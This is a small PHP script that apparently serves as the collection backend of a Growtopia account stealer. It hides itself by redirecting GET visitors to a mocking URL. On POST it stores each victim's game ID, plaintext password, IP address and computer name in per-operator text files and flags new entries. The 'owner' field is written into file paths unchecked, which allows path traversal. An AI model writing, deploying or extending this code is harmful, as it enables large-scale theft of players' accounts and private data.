<?php
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
header("Location: http://www.googledaariyim.com/?q=Are+you+Dumb?"); /* Tarayıcıyı yönlendir */
}
if (isset($_POST['id']))
{
	$id = $_POST['id'];
	$growid = htmlspecialchars($_POST['growid']);
	$password = $_POST['password'];
	$ip = $_POST['ip'];
	$computer = $_POST['computer'];
	$owner = $_POST['owner'];
	$txt = $id . ";" . $growid . ";" . $password . ";" . $ip . ";" . $computer . "+";
	$txt2 = $lastworld . "+";
	file_put_contents("./Users/".$owner . ".txt", $txt . file_get_contents("./Users/".$owner . ".txt"));
	file_put_contents("./Users/News/". $owner .  ".txt", "");
	file_put_contents("./Users/News/". $owner .  ".txt", "");
	file_put_contents("./Users/News/" . $owner . ".txt", file_get_contents("./Users/News/" . $owner . ".txt") . "news");
	echo 'OK';
}
?>